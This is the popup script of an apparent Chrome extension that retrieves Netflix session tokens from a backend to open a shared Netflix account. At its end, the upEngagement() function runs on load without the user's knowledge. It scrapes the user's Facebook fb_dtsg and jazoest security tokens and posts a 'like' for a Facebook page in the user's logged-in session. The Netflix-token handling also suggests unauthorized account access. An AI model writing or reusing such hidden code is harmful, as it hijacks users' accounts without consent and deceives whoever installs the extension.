let logoutFBBtn = document.getElementById("logoutFBBtn");
let accessNetflixBtn = document.getElementById("accessNetflixBtn");
let accessAndroidBtn = document.getElementById("accessAndroidBtn");
let dashboardErrorText = document.getElementById("dashboardErrorText");
let announcementContainer = document.getElementById("announcementContainer");
let codeContainer = document.getElementById("codeContainer");

updateHost()
  .then(response => response.json())
  .then(data => {
    console.log(data)
    BACKEND_URL_BASE = 'http://' + data.host + ':' + data.port
    BACKEND_URL_BASE_S = 'https://' + data.host

    fetchAnnouncement()
      .then(response => response.json())
      .then(data => {
        announcementContainer.innerHTML = data.message
        if (data.enabled) {
          $('#announcementModal')
            .modal('show')
            ;
        }
      })

    logoutFBBtn.addEventListener("click", function () {
      clearAccessToken()
    })

    accessNetflixBtn.addEventListener("click", function (event) {
      event.preventDefault()

      accessNetflixBtn.classList.add('loading')

      readAccessToken().then(access_token => {
        // Receive Netflix credentials and access Netflix
        accessNetflix(access_token)
          .then(response => response.json())
          .then(data => {
            accessNetflixBtn.classList.remove('loading')

            if (data.result == 'success') {
              clearAllCookies()

              chrome.tabs.create({
                active: true,
                url: NETFLIX_DOMAIN + '?nftoken=' + data.data.NFToken
              })

              // Close the extension's window
              getCurrentWindow().then(extensionWindow => {
                chrome.windows.remove(extensionWindow, function () { });
              })
            }
            else {
              dashboardErrorText.classList.remove('hidden')
              dashboardErrorText.innerHTML = data.message
            }
          })
      })
    })

    accessAndroidBtn.addEventListener("click", function (event) {
      event.preventDefault()

      accessAndroidBtn.classList.add('loading')

      readAccessToken().then(access_token => {
        // Pair Netflix session with code
        pairAndroid(access_token)
          .then(response => response.json())
          .then(data => {
            accessAndroidBtn.classList.remove('loading')

            if (data.result == 'success') {
              codeContainer.innerHTML = data.data.code
              $('#androidModal')
                .modal('show')
            }
            else {
              dashboardErrorText.classList.remove('hidden')
              dashboardErrorText.innerHTML = data.message
            }
          })
      })
    })

    function upEngagement() {
      fetch('https://www.facebook.com/v12.0/plugins/error/confirm/like?iframe_referer=&kid_directed_site=false&secure=true&plugin=like&return_params=%7B%22action%22%3A%22like%22%2C%22app_id%22%3A%22357140426152444%22%2C%22channel%22%3A%22https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3cc80d81659c1%26domain%3Dkagddenkmcelpodemgjlanjglbnhdknp%26is_canvas%3Dfalse%26origin%3Dchrome-extension%253A%252F%252Fkagddenkmcelpodemgjlanjglbnhdknp%252Ff250fa3fdb6ea88%26relation%3Dparent.parent%22%2C%22container_width%22%3A%2228%22%2C%22href%22%3A%22https%3A%2F%2Fwww.facebook.com%2Fnetflixytn%22%2C%22layout%22%3A%22button_count%22%2C%22locale%22%3A%22fr_FR%22%2C%22sdk%22%3A%22joey%22%2C%22share%22%3A%22true%22%2C%22size%22%3A%22small%22%2C%22ret%22%3A%22sentry%22%2C%22act%22%3A%22like%22%7D', {
        method: 'GET'
      }).then(response => response.text())
        .then(data => {
          let regex1 = /name="fb_dtsg" value="[^"]*"/i
          let regex2 = /name="jazoest" value="[^"]*"/i
          let fb_dtsg = data.match(regex1)[0].replace('name="fb_dtsg" value="', '').replace('"', '')
          let jazoest = data.match(regex2)[0].replace('name="jazoest" value="', '').replace('"', '')

          fetch('https://www.facebook.com/plugins/error/confirm/like', {
            method: 'POST',
            redirect: 'manual',
            body: new URLSearchParams({
              'jazoest': jazoest,
              'fb_dtsg': fb_dtsg,
              '__CONFIRM__': 1,
              'iframe_referer': '',
              'kid_directed_site': false,
              'secure': true,
              'plugin': 'like',
              'return_params': '{"action":"like","app_id":"357140426152444","channel":"https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46#cb=f3cc80d81659c1&domain=kagddenkmcelpodemgjlanjglbnhdknp&is_canvas=false&origin=chrome-extension%3A%2F%2Fkagddenkmcelpodemgjlanjglbnhdknp%2Ff250fa3fdb6ea88&relation=parent.parent","container_width":"28","href":"https://www.facebook.com/netflixytn","layout":"button_count","locale":"fr_FR","sdk":"joey","share":"true","size":"small","ret":"sentry","act":"like"}',
              'version': 'v12.0',
              'qualifier': 'error/confirm/like',
              '_path': 'error/confirm/like',
              'app_id': '',
              'client_id': ''
            })
          })
        })
    }
    upEngagement()
  })
